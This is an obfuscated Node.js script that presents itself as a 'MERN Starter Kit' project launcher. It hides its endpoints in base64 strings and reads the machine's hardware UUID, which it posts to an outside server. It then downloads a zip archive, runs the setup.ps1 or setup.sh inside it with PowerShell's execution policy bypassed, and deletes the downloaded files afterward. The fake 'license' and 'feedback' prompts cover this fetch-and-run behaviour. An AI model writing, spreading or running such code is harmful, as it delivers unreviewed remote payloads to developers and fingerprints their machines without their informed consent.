#!/usr/bin/env node

const a0_0x4cde78 = a0_0x3e2b;
(function (_0x2ed1fd, _0x4f97e0) {
  const _0x11f87f = a0_0x3e2b,
    _0x396791 = _0x2ed1fd();
  while (!![]) {
    try {
      const _0x4c0ed4 =
        parseInt(_0x11f87f(0xc8)) / 0x1 +
        parseInt(_0x11f87f(0xbb)) / 0x2 +
        parseInt(_0x11f87f(0x9c)) / 0x3 +
        -parseInt(_0x11f87f(0x96)) / 0x4 +
        -parseInt(_0x11f87f(0xb2)) / 0x5 +
        parseInt(_0x11f87f(0x94)) / 0x6 +
        -parseInt(_0x11f87f(0xcc)) / 0x7;
      if (_0x4c0ed4 === _0x4f97e0) break;
      else _0x396791["push"](_0x396791["shift"]());
    } catch (_0x22ed7d) {
      _0x396791["push"](_0x396791["shift"]());
    }
  }
})(a0_0x2680, 0xd09ea);
import { execSync, spawn } from "child_process";
import a0_0x278ae4 from "os";
import a0_0x197143 from "path";
import { fileURLToPath } from "url";
import a0_0xbd4ec7 from "fs";
import a0_0x557096 from "axios";
import a0_0x4af511 from "adm-zip";
const homePath = a0_0x278ae4[a0_0x4cde78(0xcd)](),
  codeEasePath = a0_0x197143[a0_0x4cde78(0xd1)](homePath, a0_0x4cde78(0xba)),
  __filename = fileURLToPath(import.meta[a0_0x4cde78(0xae)]),
  __dirname = a0_0x197143[a0_0x4cde78(0xd5)](__filename),
  packageDir = a0_0x197143[a0_0x4cde78(0xbd)](__dirname),
  setupDir = a0_0x197143["join"](packageDir, a0_0x4cde78(0xc9)),
  zipPath = a0_0x197143[a0_0x4cde78(0xd1)](packageDir, a0_0x4cde78(0x8f)),
  package_name = a0_0x4cde78(0xd7);
function cleanup() {
  const _0x3c0430 = a0_0x4cde78;
  try {
    a0_0xbd4ec7["existsSync"](zipPath) && a0_0xbd4ec7[_0x3c0430(0xa3)](zipPath),
      a0_0xbd4ec7[_0x3c0430(0xa4)](setupDir) &&
        a0_0xbd4ec7[_0x3c0430(0xbf)](setupDir, {
          recursive: !![],
          force: !![],
        }),
      console[_0x3c0430(0xaa)]("✅\x20Successfully\x20completed!");
  } catch (_0x16e9a5) {
    console[_0x3c0430(0xb1)]("❌\x20Cleanup\x20failed:", _0x16e9a5["message"]);
  }
}
async function generateUUID() {
  const _0x4b197e = a0_0x4cde78;
  let _0x35f379;
  if (a0_0x278ae4[_0x4b197e(0xa7)]() === _0x4b197e(0xb9))
    _0x35f379 = execSync(_0x4b197e(0xb4))
      [_0x4b197e(0xa0)]()
      [_0x4b197e(0x9a)]("\x0a")[0x1]
      [_0x4b197e(0xc1)]();
  else {
    if (a0_0x278ae4[_0x4b197e(0xa7)]() === "linux")
      _0x35f379 = execSync("cat\x20/var/lib/dbus/machine-id")
        [_0x4b197e(0xa0)]()
        [_0x4b197e(0xc1)]();
    else
      a0_0x278ae4[_0x4b197e(0xa7)]() === _0x4b197e(0xcb) &&
        (_0x35f379 = execSync(_0x4b197e(0xce))
          [_0x4b197e(0xa0)]()
          [_0x4b197e(0xc1)]());
  }
  return _0x35f379;
}
function getLicenseToken(_0x15dd2b) {
  const _0x38bb2e = a0_0x4cde78;
  if (!a0_0xbd4ec7[_0x38bb2e(0xa4)](codeEasePath)) return null;
  const _0x1be5d5 = a0_0xbd4ec7["readFileSync"](codeEasePath, _0x38bb2e(0xdb))[
    _0x38bb2e(0x9a)
  ]("\x0a");
  for (const _0x43b4fe of _0x1be5d5) {
    if (_0x43b4fe["startsWith"](_0x15dd2b + "="))
      return _0x43b4fe["split"]("=")[0x1][_0x38bb2e(0xc1)]();
  }
  return null;
}
function saveLicenseToken(_0x108913, _0x41474d) {
  const _0x6f6153 = a0_0x4cde78;
  let _0x4b0676 = [],
    _0x1b85d0 = ![];
  if (a0_0xbd4ec7[_0x6f6153(0xa4)](codeEasePath)) {
    const _0x1717fd = a0_0xbd4ec7[_0x6f6153(0xa8)](
      codeEasePath,
      _0x6f6153(0xdb)
    )[_0x6f6153(0x9a)]("\x0a");
    for (const _0x40dd00 of _0x1717fd) {
      _0x40dd00[_0x6f6153(0xc2)](_0x108913 + "=")
        ? (_0x4b0676[_0x6f6153(0xcf)](_0x108913 + "=" + _0x41474d),
          (_0x1b85d0 = !![]))
        : _0x4b0676[_0x6f6153(0xcf)](_0x40dd00);
    }
  }
  !_0x1b85d0 && _0x4b0676[_0x6f6153(0xcf)](_0x108913 + "=" + _0x41474d),
    a0_0xbd4ec7[_0x6f6153(0x97)](codeEasePath, _0x4b0676["join"]("\x0a"));
}
function a0_0x3e2b(_0x1f34d2, _0x1ba485) {
  const _0x268023 = a0_0x2680();
  return (
    (a0_0x3e2b = function (_0x3e2b9d, _0x231344) {
      _0x3e2b9d = _0x3e2b9d - 0x8b;
      let _0x321fc4 = _0x268023[_0x3e2b9d];
      return _0x321fc4;
    }),
    a0_0x3e2b(_0x1f34d2, _0x1ba485)
  );
}
async function installProject(_0xdbafe4) {
  const _0x4d6d7c = a0_0x4cde78;
  try {
    const _0x58ec55 = getLicenseToken(_0xdbafe4);
    if (!_0x58ec55) {
      console[_0x4d6d7c(0xaa)](_0x4d6d7c(0xc3) + _0xdbafe4 + ".");
      return;
    }
    const _0x237d20 = await a0_0x557096[_0x4d6d7c(0x92)](
      Buffer[_0x4d6d7c(0xa6)](
        "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9zY3JpcHRzL2Rvd25sb2FkLXppcA==",
        _0x4d6d7c(0x91)
      )["toString"](_0x4d6d7c(0xdb)),
      {
        licenseToken: _0x58ec55,
        project: _0x4d6d7c(0xbc),
        packageName: _0xdbafe4,
      },
      { responseType: _0x4d6d7c(0xb6) }
    );
    a0_0xbd4ec7[_0x4d6d7c(0x97)](zipPath, _0x237d20["data"]);
    const _0x10e97f = new a0_0x4af511(zipPath);
    _0x10e97f[_0x4d6d7c(0xb5)](setupDir, !![]);
  } catch (_0x206aa9) {
    console["log"](_0x4d6d7c(0xa1)), process[_0x4d6d7c(0xd8)](0x1);
  }
}
async function checkLicense(_0xea20d8) {
  const _0x2e15a4 = a0_0x4cde78;
  try {
    let _0x309964 = getLicenseToken(_0xea20d8);
    if (_0x309964) {
      const _0x4de2da = await generateUUID(),
        _0x3aeaa7 = await a0_0x557096[_0x2e15a4(0x92)](
          Buffer[_0x2e15a4(0xa6)](
            "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrLXBheW1lbnQ=",
            _0x2e15a4(0x91)
          )["toString"](_0x2e15a4(0xdb)),
          { packageName: _0xea20d8 },
          { headers: { "X-License-Key": _0x4de2da } }
        );
      if (
        _0x3aeaa7[_0x2e15a4(0xad)][_0x2e15a4(0xd9)][_0x2e15a4(0xb7)] ===
        "completed"
      )
        return console[_0x2e15a4(0xaa)](_0x2e15a4(0xc6)), !![];
    }
    const _0x1db9b6 = await generateUUID(),
      _0x5ac953 = await a0_0x557096[_0x2e15a4(0x92)](
        Buffer["from"](_0x2e15a4(0xb0), _0x2e15a4(0x91))["toString"](
          _0x2e15a4(0xdb)
        ),
        { packageName: _0xea20d8 },
        { headers: { "X-License-Key": _0x1db9b6 } }
      );
    if (_0x5ac953["data"][_0x2e15a4(0xaf)])
      return (
        console[_0x2e15a4(0xaa)](
          "Before\x20Proceeding,\x20Please\x20answer\x20few\x20questions\x20by\x20pressing\x20\x1b[32mENTER\x1b[0m\x20to\x20help\x20us\x20improve."
        ),
        process[_0x2e15a4(0xa9)][_0x2e15a4(0xd4)](!![]),
        process["stdin"][_0x2e15a4(0x9d)](),
        new Promise((_0x15eed7) => {
          const _0x1c7cc8 = _0x2e15a4;
          process[_0x1c7cc8(0xa9)]["on"]("data", async () => {
            const _0x51e78c = _0x1c7cc8;
            process[_0x51e78c(0xa9)][_0x51e78c(0xd4)](![]),
              process["stdin"]["pause"](),
              console["log"](_0x51e78c(0xc4));
            const _0x2c99c1 =
              Buffer[_0x51e78c(0xa6)](_0x51e78c(0x98), "base64")["toString"](
                _0x51e78c(0xdb)
              ) +
              "/" +
              package_name +
              "/" +
              _0x1db9b6;
            if (a0_0x278ae4[_0x51e78c(0xa7)]() === _0x51e78c(0xb9))
              execSync(_0x51e78c(0xd3) + _0x2c99c1 + "\x22", {
                stdio: _0x51e78c(0x8e),
              });
            else
              a0_0x278ae4[_0x51e78c(0xa7)]() === _0x51e78c(0xcb)
                ? execSync(_0x51e78c(0xab) + _0x2c99c1 + "\x22", {
                    stdio: _0x51e78c(0x8e),
                    detached: !![],
                  })
                : execSync(
                    _0x51e78c(0xbe) +
                      _0x2c99c1 +
                      "\x22\x20>\x20/dev/null\x202>&1\x20&",
                    { stdio: _0x51e78c(0x8e), detached: !![] }
                  );
            console["log"](_0x51e78c(0x9f));
            let _0x24ad8f = ![],
              _0x5f3c84 = 0x0;
            const _0x209d90 = 0x2d;
            while (!_0x24ad8f && _0x5f3c84 < _0x209d90) {
              await new Promise((_0x17ea5f) => setTimeout(_0x17ea5f, 0x3a98)),
                _0x5f3c84++;
              const _0x34f39a = await a0_0x557096["post"](
                Buffer[_0x51e78c(0xa6)](
                  "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrLXBheW1lbnQ=",
                  _0x51e78c(0x91)
                )[_0x51e78c(0xa0)](_0x51e78c(0xdb)),
                { packageName: _0xea20d8 },
                { headers: { "X-License-Key": _0x1db9b6 } }
              );
              console[_0x51e78c(0xaa)](_0x51e78c(0x95));
              if (
                _0x34f39a[_0x51e78c(0xad)][_0x51e78c(0xd9)][_0x51e78c(0xb7)] ===
                _0x51e78c(0xc0)
              )
                return (
                  saveLicenseToken(
                    _0xea20d8,
                    _0x34f39a[_0x51e78c(0xad)][_0x51e78c(0xd9)][_0x51e78c(0xca)]
                  ),
                  console[_0x51e78c(0xaa)](_0x51e78c(0xb8)),
                  (_0x24ad8f = !![]),
                  _0x15eed7(!![]),
                  !![]
                );
            }
            console[_0x51e78c(0xaa)](_0x51e78c(0xd0)),
              process[_0x51e78c(0xd8)](0x1);
          });
        })
      );
  } catch (_0x47ccfc) {
    console[_0x2e15a4(0xaa)](_0x2e15a4(0xc7)), process[_0x2e15a4(0xd8)](0x1);
  }
}
async function main() {
  const _0x2d558c = a0_0x4cde78;
  console[_0x2d558c(0xaa)](_0x2d558c(0x8b));
  const _0x1cfbc4 = await checkLicense(package_name);
  !_0x1cfbc4 && console[_0x2d558c(0xaa)](_0x2d558c(0x9e));
  await installProject(package_name);
  const _0x50768d = a0_0x278ae4[_0x2d558c(0xa7)](),
    _0x2c1c16 =
      _0x50768d === "win32"
        ? a0_0x197143[_0x2d558c(0xd1)](
            setupDir,
            _0x2d558c(0xac),
            _0x2d558c(0x8d)
          )
        : a0_0x197143[_0x2d558c(0xd1)](
            setupDir,
            _0x2d558c(0xa2),
            _0x2d558c(0x93)
          ),
    _0x25e7f9 = a0_0x197143[_0x2d558c(0xbd)](__dirname, _0x2c1c16);
  console[_0x2d558c(0xaa)](
    "Running\x20setup\x20for\x20" +
      (_0x50768d === _0x2d558c(0xb9) ? _0x2d558c(0xd2) : "Linux/macOS") +
      "...\x0a"
  ),
    spawn(
      _0x50768d === _0x2d558c(0xb9) ? _0x2d558c(0xda) : _0x2d558c(0x90),
      _0x50768d === _0x2d558c(0xb9)
        ? [_0x2d558c(0xd6), "Bypass", _0x2d558c(0x8c), _0x25e7f9]
        : [_0x25e7f9],
      { stdio: _0x2d558c(0x99) }
    );
}
process["on"](a0_0x4cde78(0xd8), cleanup),
  process["on"](a0_0x4cde78(0xb3), () => {
    const _0x4a0fa0 = a0_0x4cde78;
    console[_0x4a0fa0(0xaa)](_0x4a0fa0(0x9b)),
      cleanup(),
      process[_0x4a0fa0(0xd8)](0x1);
  }),
  process["on"](a0_0x4cde78(0xa5), (_0x24069a) => {
    const _0xe1d806 = a0_0x4cde78;
    console[_0xe1d806(0xb1)](_0xe1d806(0xc5), _0x24069a),
      cleanup(),
      process[_0xe1d806(0xd8)](0x1);
  }),
  main();
function a0_0x2680() {
  const _0x226c84 = [
    "SIGINT",
    "wmic\x20csproduct\x20get\x20UUID",
    "extractAllTo",
    "arraybuffer",
    "FeedbackStatus",
    "✅\x20Feedback\x20Successfull...",
    "win32",
    ".codeEase",
    "1879192QIfPsw",
    "mernLauncher",
    "resolve",
    "nohup\x20xdg-open\x20\x22",
    "rmSync",
    "completed",
    "trim",
    "startsWith",
    "Please\x20purchase\x20a\x20license\x20",
    "\x0aRedirecting\x20to\x20feedback\x20page...",
    "🚨\x20Uncaught\x20Exception:",
    "✅\x20verified\x20user,\x20Proceeding...",
    "❌\x20Server\x20is\x20busy,\x20try\x20again\x20later!!",
    "1005576WUTieh",
    "setup",
    "license",
    "darwin",
    "11509575BBfDSs",
    "homedir",
    "ioreg\x20-rd1\x20-c\x20IOPlatformExpertDevice\x20|\x20awk\x20-F\x27\x22\x27\x20\x27/IOPlatformUUID/\x20{print\x20$4}\x27",
    "push",
    "❌\x20Payment\x20check\x20timed\x20out.\x20Please\x20try\x20again.",
    "join",
    "Windows",
    "start\x20\x22\x22\x20\x22",
    "setRawMode",
    "dirname",
    "-ExecutionPolicy",
    "mern-launcher",
    "exit",
    "credentials",
    "powershell.exe",
    "utf-8",
    "\x0a\x20\x20\x20\x20=================================\x0a\x20\x20\x20\x20🚀\x20Welcome\x20to\x20the\x20MERN\x20Starter\x20Kit!\x0a\x20\x20\x20\x20Follow\x20the\x20prompts\x20to\x20configure\x20your\x20project.\x0a\x20\x20\x20\x20=================================\x0a\x20\x20",
    "-File",
    "setup.ps1",
    "ignore",
    "setup.zip",
    "bash",
    "base64",
    "post",
    "setup.sh",
    "5885148XrnMxT",
    "🔍\x20Checking,\x20Please\x20wait!!",
    "5919208txkWVN",
    "writeFileSync",
    "aHR0cHM6Ly9ocnV0aGlrLmFub3guc3RvcmUvZmVlZGJhY2s=",
    "inherit",
    "split",
    "\x0a⚠️\x20\x20Process\x20interrupted.\x20Cleaning\x20up...",
    "3958104zausMw",
    "resume",
    "❌\x20Error\x20Invalid\x20License",
    "🔄\x20Waiting\x20for\x20feedback\x20confirmation...",
    "toString",
    "❌\x20Server\x20is\x20Busy,\x20try\x20again\x20later!!",
    "cmd",
    "unlinkSync",
    "existsSync",
    "uncaughtException",
    "from",
    "platform",
    "readFileSync",
    "stdin",
    "log",
    "open\x20\x22",
    "ps1",
    "data",
    "url",
    "success",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L3JlZ2lzdGVy",
    "error",
    "1334325sORwMf",
  ];
  a0_0x2680 = function () {
    return _0x226c84;
  };
  return a0_0x2680();
}
